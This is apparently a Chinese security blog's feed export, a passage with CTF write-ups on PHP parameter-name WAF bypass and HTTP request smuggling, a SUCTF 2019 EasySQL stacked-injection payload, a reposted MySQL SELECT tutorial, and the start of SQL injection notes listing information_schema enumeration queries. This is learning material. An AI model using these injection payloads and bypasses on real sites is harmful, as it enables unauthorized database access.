src="/461215164/1.png" alt><br>具体可以参考下面这张某大佬的图，其中两边的被直接去掉了，而中间的则会被替换为<code>_</code><br><img src="https://image.3001.net/images/20190904/1567560448_5d6f13004035f.png" alt></p><p>脚本</p><pre><code>&lt;?phpforeach(    [        &quot;{chr}foo_bar&quot;,        &quot;foo{chr}bar&quot;,        &quot;foo_bar{chr}&quot;    ] as $k =&gt; $arg){    for ($i=0;$i&lt;=255;$i++){        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg),$o);        foreach ($o as $key =&gt; $value) {            if ($key == &#39;foo_bar&#39;){                echo str_replace(&quot;{chr}&quot;,chr($i),&quot;[&quot;.$arg).&quot;] -&gt; [&quot;.$key.&quot;]&quot;;                echo &quot;\n&quot;;            }        }    }    echo &quot;\n&quot;;}</code></pre><p>这道题目本来是以为在后端做的过滤，这样看应该是对str做完过滤之后，在传到后端，而前waf检查的只是num，而<code>num</code>则放过去了，但是在后端却解析成了num，可以用这个trick绕过一些前端对于特定变量的检验</p><h2 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h2><p>2020.4.18修改</p><p>重新写一下之前理解的不够透彻，现在回过头来重新回顾下这道题目</p><p>先看上次的哪个payload<br><img src="/461215164/2.png" alt><br>典型的CL-CL型的HTTP请求走私，但是HTTP走私请求当中应该是除了CL不为0的为GET型的请求其他的都为POST型才对，而且需要HTTP协议为1.1。这也是一直没看懂这个题目的原因之一，但是先不管这个，我们看payload。<br><img src="/461215164/3.png" alt></p><blockquote><p>在RFC7230中规定：如果收到不带Transfer-Encoding头字段且带着不同的Content-Length头字段，其中包含的值不小，则消息帧无效，并且收件人必须将其视为不可恢复的错误。如果这是一个请求消息，服务器必须以400（错误请求）响应状态代码，然后关闭连接。如果这是回应代理收到的消息，代理必须关闭连接发送到服务器，丢弃收到的响应，然后发送502（错误 网关）对客户端的响应。如果这是响应消息用户代理收到后，该用户代理必须关闭连接到服务器并丢弃收到的响应。</p></blockquote><p>以上是谷歌翻译，从我们payload的响应包我们也能看出来服务器返回了400错误，但是却仍然执行了num，所以我猜测这道题目，应该是前端服务器返回了400错误，但是却又把我们的请求传给了后端服务器，而后端服务器却成功解析了，然后返回结果，目前的话我是这么理解的，这个payload也是我最看不懂的payload跟我理解的HTTP请求走私完全不一样，上面是目前我感觉最为接近的一个猜测。</p><p>然后根据HTTP请求的特性，我们尝试构造其他的payload进行尝试<br><img src="/461215164/4.png" alt><br>可以看出来，仍然是前端报错，但是请求却传给了后端<br>我认为的CL-TE型的HTTP请求伪造应该是接收两个请求头，前端代理服务器只处理Content-Length，后端遵守RFC2616忽略Content-Length，处理Transfer-Encoding所以感觉这个题目说是HTTP请求走私不是很正确，更像是前端的解析错误但是却又把数据传给了后端导致waf的绕过。</p><p>最后看两种payload<br><img src="/461215164/5.png" alt><br><img src="/461215164/6.png" alt><br>这两个payload一对比就看出来这个题目其实考点并不是HTTP请求走私，第一个payload还是利用报错，而第二个则是利用了HTTP请求走私把第一个payload传过去了。这一点也验证了我前面的说法……</p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuoj每日一题（1）</title>
      <link href="/164117074.html"/>
      <url>/164117074.html</url>
      
        <content type="html"><![CDATA[<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>属实没想到后台的语句</p><pre><code>select $_GET[&#39;query&#39;] || flag from flag</code></pre><p>看完，真就一脸懵逼</p><p>官方正解：</p><pre><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></pre><p>非预期解：</p><pre><code>*，1</code></pre><p>解题过程就不说了，堆叠注入，和强网杯的类似，但是考点不一样，直接分析这道题目的考点，很明显，应该是考的<code>sql_mode</code>，不知道是啥，可以看出来是个mysql内置变量，查手册学习……</p><h2 id="sql-mode"><a href="#sql-mode" class="headerlink" title="sql_mode"></a>sql_mode</h2><p><img src="/164117074/1.png" alt><br>可以知道，这是用来设置sql运行模式的（MySQL应支持的SQL语法，以及应该在数据上执行何种确认检查。），我们看看<code>PIPES_AS_CONCAT</code>的作用<br><img src="/164117074/2.png" alt><br>现在就知道，目的就是为了让||失效的，||起什么作用？<br><img src="/164117074/3.png" alt><br>我本地测试了下，等同于(select id from admin)||(select user from admin)然后根据结果返回0，1<br>这就导致我们根本无论传入什么都处于X|1的状态。<code>PIPES_AS_CONCAT</code>则是把||变为连接符把上面两个语句的结果拼接起来，返回值也从0，1变为了他们的查询结果，这样我们绕过了or。从下面两张图也可以看出来<br><img src="/164117074/4.png" alt>)<img src="/164117074/5.png" alt></p><p>而<code>*，1</code>非预期解就很好理解了，拼接完是<code>select *,1||flag from Flag</code>而or有截断特性，当为1是后面的就不会再去看了，就等于执行了<code>select *,1 from Flag</code></p><p>sql_mode感觉可以搞得骚操作还是挺多了 ，就不深究了，到这就完了……</p><h2 id="考点总结"><a href="#考点总结" class="headerlink" title="考点总结"></a>考点总结</h2><ol><li>堆叠注入</li><li>||运算符</li><li>sql_mode–》PIPES_AS_CONCAT</li></ol><p>想要做出来这道题目，还是需要一定的数据库基础的，起码要知道数据库中有这个东西才行，但是貌似做题木的后端源码，就很操蛋……做出来的属实NP，膜了</p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>dedeCMS后台注入</title>
      <link href="/4199229624.html"/>
      <url>/4199229624.html</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Please enter the password to read.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="9d5fe6536948b61784e9aba73a2e0944c4632865068c397e9e5883981bd02d7d">9e41d281158d15ba527e130a9ec452ffa868d6ff44df91dcd5aac8b3a003f46391aa8baa40d49a1bad55da19b3aa37c04b89892134522e0b7f5662795ae3ffcad4d6299ff8be251c2927fcceb3775cb5bcd0aa0ca098c7232a98605032ea3a1153e82183cf6969f06d2d8dd448f1a444197d4d93469b7bc48608d5ba4913f935045ac1fa1648c4e6b42184911bad3c0ca09bcdb519444724edfa280b893cfa902ec7ec24c11cba629f37bf7202473a65e2a6d99072287e471b777b42d5ccb47f3572bfa1df1d8eab8ff7ef20304e47d3631a773d97cc29f317797d14e79792348697e7cbb5019b17c6630231b28e30730677620d555537a87daca1ad5348823961d6c8b9af861e5b385f18900894b5d6cf3ffb0a716ac3d15a3899ab489ac4b7fad2db4c7563f4cbb9d1ce9f0e6e077db4daaf6ac67f33732c17592099fcc958b13415fe8ed7499cdb3a28803d3600f280e3dbc157f814dccfcbc9baecad7034baec734402fae8d00584202e2ac84db91493ec56ab5a292e7f78e9116ff741b3f0232bad671857a3b2bf6ccc15aa64d29a3e1b82fcf3687657306c6175d2d210d73312515884dcbde8080da5cf3b530e92c710c05c8cde810ad32d89d394b3e1039689ac0e62bbd4504484ec01dbbc2fcc42358a2d50290e56fd3e5b7d395c2843b970a1ad6d7c46a4f10861633c91638809582c9d9ae8ba8593a3f9d8e3636d5ebd3bb9c950622ed0fa6cb4b094835acf3896ab386160d514130c4ca56e4458a89c5013c1fedad119b4afd5a30b270ccaaced5a904de366edd3ea86c73ca5a797218a6c9e7be96aa2e2ad24cb3e61556e5d755132b445065ae318bf7b35cc0648bce461be5515b8ea17b8b07be8e359c910ce81c02cc67c973bfe9acba476629e33d6e96a0bd2715589a9ae42720a197f5010254910cd8ef081e7af7f4c1958a32d0cf1dcf4a7cdc1d708cb2730e107303d61e3b8e5167595cdbbb9b4da154950e4224cda4656cfb681207a1cc3045559ff18e40d75537a8c1811bd354a7782f493d72315cccf0b5362da294729fe0b1072eac0335523520ca6bd495a9d975742d0c19e380edc091183e88360dc7bff0eaaf42237f7bb9ce6f776a991f8950c51bc8093362d843159758c5d13e07435f02abce61305689ccdd1e5cce732c4d3eafeb3165a358f3a8881d2bd63c44c592e127eaf6b530c417eaa6747844213fdfc8a74eb79e858e5547dc419b396cada9395bb91b6705edb42368ac6e561610a7601064a1ed52e7e2ea9541e9cd705ae07dea9235a855e25a4ed9ee382001d905dbb0ad8b1abb61a97eddc4c025f4fa44d789caf5d80176889f27a47a2bdb32ad98c41f297c6aeefcb790cbe8347bfd18047fc00c5b47e9085a53fd24b02bad5e7f92a1a7e471db6a7e0059e57f488a0fbef96ceefe82a98bee36d90ac17192b0a345f6f866a31a0c0e238fe35bed58824e5a35c022e435d5ed2592cafd77811a925fcdcf35f1f869190f08401dfd7a13eaf9e3be8e4092a1d7bf2bf1eba41d583bb2322cf0bc2c465a0e7357492117355c5c872b7cb5655fd3c1131c3dba353e1b7f5bf180cc670f6dcd25afaba9fe31485cbb9236460c07522aed6342f244abb923236c3bb02f08dc797b7397c05c8ff27b6b6e8501fe6a7e5bc477a7756675c0b4171e2c840b3383b4a289682366aab0969fa711571d5fd5f38060c358db00595dad603f2cc3beaec4b80c30ba63824dbd09a6480da93d897eae1d26357a642684c28caa8e893c51f7518dafae5dc412a2d580db996f9a7471f87d168d32f2a9b43cd67b6ad23448b30c4badaa3b1d7d2e777cabbc6e39435f5c24cc753efbb372b2850d4408f43eda44d0bf7bd0cc49836b2956f5afbb31d15b134cd527b6ea2dbdd4070fa2068243644b44a974fc6e430d273d187940a35a2f0c453a2ba231c7e6c60c6f110062369f837ed97d20ca9723adf503566c5cf7a7c3c9d0301fad73c0410d14b696b4c20003761fdad1b2fd630194da673ceb609489513ae4058ffe2ae0599078b34bf2ac952619c0d64d491bcd72d26420e8e4e183e8d80eb7c0524f330e868f21969f39908af777b79423bfdc9bd7192a0207266fa8ce39e391dbbac3d6d809320fbc48af5d026a4dd72cd987d8fab3bff2f616406ef48a774acfb5c9b784f37bf24259dae01a308f3a34ad22a689e91d87d72d74bad9110b97dcf344b40ed8da64b05f2cd75438a14d5daecab8c58c90b1c4aa67b2d40606ceebc38aadcdaee2bb71fa7046ae67222da6c5dd4b8bd9bcc6537e28a1c77507c19904bacdbb12729cbcac50cd2cad78dd2c6dc04cebfe37a7e8ae60adcfb2f27922198089839ebc4d3d16136010778e52ce54d8905fc77dbfa1f6293dcba7a</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[转载]MySQL的select语法</title>
      <link href="/2726031424.html"/>
      <url>/2726031424.html</url>
      
        <content type="html"><![CDATA[<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>本文转载自：<a href="https://blog.csdn.net/zhyoulun/article/details/78513221" target="_blank" rel="noopener">https://blog.csdn.net/zhyoulun/article/details/78513221</a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>SQL中最常用的当属<code>select</code>命令了，它被用于从一张或者多张表中获取数据，简单的使用例子例如是<code>select * from tab_name</code>，可以将一张表中的所有数据取出来；但又由于支持条件过滤、分组、排序、合并、嵌套查询等等特性，有些应用场景中的SQL可以说是非常复杂，下面我们就来整理一下SQL支持的语法都有哪些。</p><p><code>select</code>完整的语法结构如下所示，可以说是非常庞大的。</p><pre><code>    SELECT        [ALL | DISTINCT | DISTINCTROW ]          [HIGH_PRIORITY]          [STRAIGHT_JOIN]          [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]          [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]        select_expr [, select_expr ...]        [          FROM table_references          [PARTITION partition_list]        [WHERE where_condition]        [GROUP BY {col_name | expr | position}          [ASC | DESC], ... [WITH ROLLUP]]        [HAVING where_condition]        [ORDER BY {col_name | expr | position}          [ASC | DESC], ...]        [LIMIT {[offset,] row_count | row_count OFFSET offset}]        [PROCEDURE procedure_name(argument_list)]        [INTO OUTFILE &#39;file_name&#39;            [CHARACTER SET charset_name]            export_options          | INTO DUMPFILE &#39;file_name&#39;          | INTO var_name [, var_name]]        [FOR UPDATE | LOCK IN SHARE MODE]        ]</code></pre><p>如下是我总结的select语法流程图：</p><p><img src="http://mdimg.fabuler.cn/1711/p002.png" alt="select语法流程图"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="SELECT-select-expr-select-expr-…"><a href="#SELECT-select-expr-select-expr-…" class="headerlink" title="SELECT select_expr [, select_expr …]/"></a>SELECT select_expr [, select_expr …]/</h3><p>其中的中括号表示可选的意思，所以只需要<code>SELECT select_expr</code>这两部分，<code>select</code>就可以正常工作啦，这两部分也是必选的。举个例子：</p><ul><li>查询数字 <code>select 1</code> 结果：<code>1</code></li><li>查询字符串 <code>select &#39;a&#39;</code> 结果：<code>a</code></li><li>查询计算结果 <code>select 1+1</code> 结果：<code>2</code></li><li>查询当前时间 <code>select now()</code> 结果：<code>2017-11-11 15:23:11</code></li></ul><p>当然我们也可以查询多个<code>select_expr</code>，这时的语法结构是<code>SELECT select_expr [, select_expr ...]</code>。</p><h3 id="FROM-table-references"><a href="#FROM-table-references" class="headerlink" title="FROM table_references"></a>FROM table_references</h3><p>大部分情况下，我们需要指定数据源，即表名，<code>FROMtable_references</code>，注意这里是<code>table_references</code>，而不是<code>table_name</code>，因为<code>table_references</code>可以代指多张表的组合。组合的方法查考本文后边提到的<code>JOIN</code>语法。我们暂时只考虑一张表。</p><p>假设我们有一张表，表名为<code>student</code>，字段有<code>id, name, age, create_time</code>，</p><ul><li>查询<code>id, name</code>两列，<code>select id, name from student</code></li><li>查询所有的列，<code>select id, name, age, create from student</code>，更简单的，<code>select * from student</code>，其中<code>*</code>指代<code>student</code>表中的所有列</li><li>给每个学生的数字id加上20110000，代表学号，<code>select id+20110000 as student_number, name from student</code></li></ul><p>上述例子中用到了<code>as</code>关键词，代表别称，可以给<code>select_expr</code>指定别名，且此时<code>as</code>是可以省略的（但是非常不建议省略，<code>select c1c2 from t1</code>等价于<code>select c1 as c2 from t1</code>，而不是<code>select c1, c2 fromt1</code>，查询时带上<code>as</code>是好习惯）。</p><p>注意：用<code>as</code>指定的别名，不能用在<code>where</code>中，因为<code>where</code>先于<code>select_expr</code>执行。</p><h3 id="缺省数据库和缺省表名"><a href="#缺省数据库和缺省表名" class="headerlink" title="缺省数据库和缺省表名"></a>缺省数据库和缺省表名</h3><p>如果使用<code>use database_name;</code>指定了缺省的数据库，那么就可以缺省使用表名了；否则，需要显示指定数据的数据库<code>select * fromdatabase_name.table_name;</code>。</p><p>如果一条查询语句只涉及到一张表，<code>select id,name fromstudent;</code>是可以正常执行的；但如果有两张表，其中有相同的字段名，例如有两个学生表<code>t1</code>和<code>t2</code>，那么查询时需要显式指定查询的字段属于哪张表，<code>selectt1.id, t1.name, t2.id, t2.name from t1, t2</code>，以避免冲突。</p><h3 id="GROUP-BY-col-name-expr-position-ASC-DESC-…-WITH-ROLLUP"><a href="#GROUP-BY-col-name-expr-position-ASC-DESC-…-WITH-ROLLUP" class="headerlink" title="[GROUP BY {col_name | expr | position} [ASC | DESC], … [WITH ROLLUP]]"></a>[GROUP BY {col_name | expr | position} [ASC | DESC], … [WITH ROLLUP]]</h3><p><code>group by</code>用来对<code>select xxx from yyy where zzz;</code>的结果做聚类，<code>select age from studentwhere id&lt;100 group byage;</code>，是对id小于100的学生做年龄聚类，返回的结果是没有重复的，这和使用<code>distinct</code>关键词是没有区别的，<code>select distinctage from student where id&lt;100;</code>。</p><p>上述使用<code>group by</code>的方法意义不大，一般我们会对每个group做统计，例如统计每个类别中学生的数量，<code>select age,count(*) ascount from student where id&lt;100 group by age;</code>。</p><p>输出的结果，缺省情况下<code>age</code>升序排列，即<code>group by age asc</code>，也可以使用<code>desc</code>是得输出结果按照<code>age</code>降序排列，<code>groupby age desc</code>。（<code>group by</code>缺省升序排列这个特性已经废弃了，建议显式说明排序方式）</p><p>此外，也可以按照<code>count</code>降序排列，<code>select age,count(*) as count from student where id&lt;100group by age order by count desc;</code></p><p><code>group by position</code>的使用方式已经废弃了，不建议使用，已被SQL标准移除。</p><h3 id="ORDER-BY-col-name-expr-position-ASC-DESC-…"><a href="#ORDER-BY-col-name-expr-position-ASC-DESC-…" class="headerlink" title="[ORDER BY {col_name | expr | position} [ASC | DESC], …]"></a>[ORDER BY {col_name | expr | position} [ASC | DESC], …]</h3><p><code>order by</code>可以对查询结果进行排序，排序指标可以有一个或者多个，例如：</p><ul><li>按照id降序排列 <code>select * from student order by id desc;</code></li><li>按照age降序排列，如果age相同，按照id升序排列 <code>select * from student order by age desc, id asc;</code></li></ul><p>使用<code>group by</code>和<code>orderby</code>做排序时，如果被排序的值较长，只会根据值的前若干部分进行排序，这个长度由系统变量<code>max_sort_length</code>确定，例如这个值是1024（bytes）。</p><p><code>order by position</code>的使用方式已经废弃了，不建议使用，已被SQL标准移除。</p><h3 id="HAVING-where-condition"><a href="#HAVING-where-condition" class="headerlink" title="[HAVING where_condition]"></a>[HAVING where_condition]</h3><p><code>having</code>用于对查询结果的过滤，和<code>where</code>类似。</p><ul><li><code>select * from student where id&lt;=10;</code></li><li><code>select * from student having id&lt;=10;</code></li></ul><p>以上两个sql语句都是可以正常执行的，但是不建议使用<code>having</code>替代<code>where</code>。</p><p><code>having</code>几乎是在MySQL服务端将结果发送给客户端之前执行的，非常靠后（<code>limit</code>在<code>having</code>之后），且不会使用优化手段，执行速度比<code>where</code>要慢很多。就用上边这里例子来说，<code>havingid&lt;=10</code>会先全表遍历，然后再返回前10行，而<code>where id&lt;=10</code>，通过使用主键等索引，只需要扫描10行就能取到最终的结果。</p><p>SQL标准要求<code>having</code>只能使用<code>group by</code>中的字段。但是MySQL支持使用<code>select</code>的字段列表。</p><h3 id="LIMIT-offset-row-count-row-count-OFFSET-offset"><a href="#LIMIT-offset-row-count-row-count-OFFSET-offset" class="headerlink" title="[LIMIT {[offset,] row_count | row_count OFFSET offset}]"></a>[LIMIT {[offset,] row_count | row_count OFFSET offset}]</h3><p><code>limit</code>用于限制返回结果的数量。<code>offset</code>的起始值是0。</p><ul><li>查询前5个学生的数据 <code>select * from student limit 5;</code></li><li>查询第6到10个学生的数据 <code>select * from student limit 5,10;</code></li><li>查询第11个之后的所有的学生的数据，用了一个比较大的整数 <code>select * from student limit 10,18446744073709551615;</code></li></ul><p>为了兼容PostgreSQL，MySQL也支持<code>limit row_count offset offset_count</code>这样的语法。</p><h3 id="PROCEDURE"><a href="#PROCEDURE" class="headerlink" title="PROCEDURE"></a>PROCEDURE</h3><p><code>PROCEDURE</code>在MySQL 5.7.18被设置为废弃状态，并会在MySQL 8.0中移除。</p><p>指定了一个procedure，用于处理结果集中的数据，参考<a href="https://dev.mysql.com/doc/refman/5.7/en/procedure-analyse.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/procedure-analyse.html</a>。</p><h3 id="嵌套查询"><a href="#嵌套查询" class="headerlink" title="嵌套查询"></a>嵌套查询</h3><p>举个例子，<code>select * from (select 1,2,3) as t1</code></p><p>其中子查询<code>select 1,2,3</code>生成的结果表，又称为导出表。该结果表必须设定一个别称，用作表名，即<code>as t1</code>。</p><h3 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h3><p>在MySQL中<code>JOIN</code>、<code>CROSS JOIN</code>和<code>INNER JOIN</code>是等价的；但在标准SQL中，是不等价的，<code>INNERJOIN</code>会和<code>ON</code>搭配使用，而<code>CROSS JOIN</code>不是。</p><p><code>INNER JOIN</code>和<code>,</code>是等价的，都会生成两张表的笛卡尔积，即第一张表中的每一行会和第二张表中的每一行组合生成新行。</p><p><code>,</code>的优先级低于<code>INNER JOIN</code>，所以这样的语句是错误的<code>select * from t1, t1 as t2 join t1 as t3 ont1.c1=t3.c1;</code>，需要都使用<code>select * from t1 join t1 as t2 join t1 as t3 ont1.c1=t3.c1;</code></p><p><code>USING(column_list)</code>中<code>column_list</code>指代的字段必须同时存在于两张表中，例如<code>a LEFT JOIN b USING (c1,c2, c3)</code></p><p><code>NATURAL [LEFT] JOIN</code>等价于<code>t1 INNER JOIN t2USING(all_same_column_list)</code>，其中<code>all_same_column_list</code>代表<code>t1</code>和<code>t2</code>表中所有名称相同的字段</p><p><code>RIGHT JOIN</code>和<code>LEFT JOIN</code>，建议使用<code>LEFT JOIN</code></p><h3 id="UNION"><a href="#UNION" class="headerlink" title="UNION"></a>UNION</h3><p><code>UNION</code>的语法</p><pre><code>    SELECT ...    UNION [ALL | DISTINCT] SELECT ...    [UNION [ALL | DISTINCT] SELECT ...]</code></pre><p><code>UNION</code>用于合并多个<code>select</code>查询结果。</p><p>第一个<code>select</code>结果中的列名称会作为总结果的列名称。</p><p>多个<code>select</code>结果中对应列的类型应该相同；否则总结果会统筹考虑所有<code>select</code>结果的值。</p><p>默认情况下，如果两个<code>select</code>的结果有相同的行，只会保留相同行中的一个。如果不希望这样的事发生，需要使用关键词<code>ALL</code>，即<code>select ...union all select ...;</code>。</p><p>如果单个<code>select</code>中使用了<code>order by</code>或者<code>limit</code>，需要用括号括起来：<br><code>​    (SELECT a FROM t1 WHERE a=10 AND B=1 ORDER BY a LIMIT 10)</code><br><code>​    UNION</code><br><code>​    (SELECT a FROM t2 WHERE a=11 AND B=2 ORDER BY a LIMIT 10);</code></p><p>可以对合并后的结果做<code>order by</code>和<code>limit</code>操作，例如：</p><p><code>​    (SELECT a FROM t1 WHERE a=10 AND B=1)</code><br><code>​    UNION</code><br><code>​    (SELECT a FROM t2 WHERE a=11 AND B=2)</code><br><code>​    ORDER BY a LIMIT 10;</code></p><p>可以使用一个固定值来连接两个表，标识数据是属于哪张表的</p><p><code>​    (SELECT 1 AS sort_col, col1a, col1b, ... FROM t1)</code><br><code>​    UNION</code><br><code>​    (SELECT 2, col2a, col2b, ... FROM t2) ORDER BY sort_col;</code></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p><code>INNER JOIN</code> <code>LEFT JOIN</code> <code>RIGHT JOIN</code>比较</p><pre><code>表t1，表t2如下所示``​    mysql&gt; select * from t1;``​    +------+------+``​    | c1   | c2   |``​    +------+------+``​    |    1 |    1 |``​    |    2 |    3 |``​    |    3 |    5 |``​    +------+------+`​`        mysql&gt; select * from t2;    +------+------+    | c1   | c2   |    +------+------+    |    1 |    2 |    |    2 |    4 |    |    4 |    6 |    +------+------+​    ​    mysql&gt; select * from t1 inner join t2;​    +------+------+------+------+​    | c1   | c2   | c1   | c2   |​    +------+------+------+------+​    |    1 |    1 |    1 |    2 |​    |    2 |    3 |    1 |    2 |​    |    3 |    5 |    1 |    2 |​    |    1 |    1 |    2 |    4 |​    |    2 |    3 |    2 |    4 |​    |    3 |    5 |    2 |    4 |​    |    1 |    1 |    4 |    6 |​    |    2 |    3 |    4 |    6 |​    |    3 |    5 |    4 |    6 |​    +------+------+------+------+​    ​    mysql&gt; select * from t1 inner join t2 on t1.c1=t2.c1;​    +------+------+------+------+​    | c1   | c2   | c1   | c2   |​    +------+------+------+------+​    |    1 |    1 |    1 |    2 |​    |    2 |    3 |    2 |    4 |​    +------+------+------+------+​        mysql&gt; select * from t1 left join t2 on t1.c1=t2.c1;    +------+------+------+------+    | c1   | c2   | c1   | c2   |    +------+------+------+------+    |    1 |    1 |    1 |    2 |    |    2 |    3 |    2 |    4 |    |    3 |    5 | NULL | NULL |    +------+------+------+------+    mysql&gt; select * from t1 right join t2 on t1.c1=t2.c1;    +------+------+------+------+    | c1   | c2   | c1   | c2   |    +------+------+------+------+    |    1 |    1 |    1 |    2 |    |    2 |    3 |    2 |    4 |    | NULL | NULL |    4 |    6 |    +------+------+------+------+`c1`是`t1`和`t2`的共有字段​    ​    mysql&gt; select * from t1 inner join t2 using (c1);​    +------+------+------+​    | c1   | c2   | c2   |​    +------+------+------+​    |    1 |    1 |    2 |​    |    2 |    3 |    4 |​    +------+------+------+​        mysql&gt; select * from t1 left join t2 using (c1);    +------+------+------+    | c1   | c2   | c2   |    +------+------+------+    |    1 |    1 |    2 |    |    2 |    3 |    4 |    |    3 |    5 | NULL |    +------+------+------+    mysql&gt; select * from t1 right join t2 using (c1);    +------+------+------+    | c1   | c2   | c2   |    +------+------+------+    |    1 |    2 |    1 |    |    2 |    4 |    3 |    |    4 |    6 | NULL |    +------+------+------+</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://dev.mysql.com/doc/refman/5.7/en/select.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/select.html</a></li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/join.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/join.html</a></li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/union.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/union.html</a></li></ul><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dedeV5.7SP2漏洞整理复现</title>
      <link href="/1024615804.html"/>
      <url>/1024615804.html</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Please enter the password to read.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="7dafe4072a455fc3fe18a746b1c8fff712f4faf26eacb23cef799834ccd4d97a"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入学习笔记</title>
      <link href="/3724188629.html"/>
      <url>/3724188629.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近看dedeCMS，发现好多全是SQL漏洞，刚好借用这个在整理总结下sql漏洞。全都基于mysql</p><h2 id="0x02-SQL漏洞原理"><a href="#0x02-SQL漏洞原理" class="headerlink" title="0x02 SQL漏洞原理"></a>0x02 SQL漏洞原理</h2><p>其实就是输入没做好，导致了可以执行sql语句进行恶意操作。</p><h2 id="0x03-漏洞类型"><a href="#0x03-漏洞类型" class="headerlink" title="0x03 漏洞类型"></a>0x03 漏洞类型</h2><h3 id="根据变量分"><a href="#根据变量分" class="headerlink" title="根据变量分"></a>根据变量分</h3><ul><li>字符型</li><li>数字型</li></ul><p>根据有无单引号判断</p><h3 id="根据注入方式分"><a href="#根据注入方式分" class="headerlink" title="根据注入方式分"></a>根据注入方式分</h3><ul><li>报错注入</li><li>盲注<ul><li>时间盲注</li><li>布尔盲注</li></ul></li><li>union联合注入</li></ul><p>其实还可以再分，但大致上就着三种，其他的话感觉都是在某些特定情况，如宽字节注入、堆叠注入等</p><h3 id="根据注入点分"><a href="#根据注入点分" class="headerlink" title="根据注入点分"></a>根据注入点分</h3><ul><li>GET注入</li><li>POST注入</li><li>Cookie注入</li><li>XFF注入</li></ul><p>……</p><h2 id="0x04-Mysql特性"><a href="#0x04-Mysql特性" class="headerlink" title="0x04 Mysql特性"></a>0x04 Mysql特性</h2><p>首先是一些内置信息函数如<code>datebase()、user()、version()</code>等，可以通过这些获取基本信息。其次就是<code>information_schema</code>，在mysql5.0版本以上会自带一个<code>information_schema</code>库，里面存储了数据库的全部信息，可以通过这个来获取表、字段的信息。</p><h3 id="获取当前用户信息"><a href="#获取当前用户信息" class="headerlink" title="获取当前用户信息"></a>获取当前用户信息</h3><p><code>select user();</code></p><h3 id="获取当前数据库版本信息"><a href="#获取当前数据库版本信息" class="headerlink" title="获取当前数据库版本信息"></a>获取当前数据库版本信息</h3><p><code>select version();</code></p><h3 id="获取当前数据库信息"><a href="#获取当前数据库信息" class="headerlink" title="获取当前数据库信息"></a>获取当前数据库信息</h3><p><code>select database();</code></p><h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p><code>select schema_name from information_schema.schemata</code></p><h3 id="获取当前数据库中的表"><a href="#获取当前数据库中的表" class="headerlink" title="获取当前数据库中的表"></a>获取当前数据库中的表</h3><p><code>select table_name from information_schema.tables where table_schema = database();</code></p><h3 id="获取表中的列"><a href="#获取表中的列" class="headerlink" title="获取表中的列"></a>获取表中的列</h3><pre><code>select column_name from information_schema.columns where table_name = &#39;admin&#39;;</code></pre><h3 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h3><pre><code>select password from admin;</code></pre><h2 id="0x05-常见注入方式"><a href="#0x05-常见注入方式" class="headerlink" title="0x05 常见注入方式"></a>0x05 常见注入方式</h2><p>上面说了mysql的基本操作，下面会根据各种注入方式是如何来利用的。</p><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><p>union就是利用可以连接两个以上的select语句的特性来实行注入<br>通常的流程：<br>（1）利用order by （当order by后面的数字小于实际的列表数时，页面返回正常，当大于列表数时将会报错）判断当前列表数。<br><img src="/3724188629/1.png" 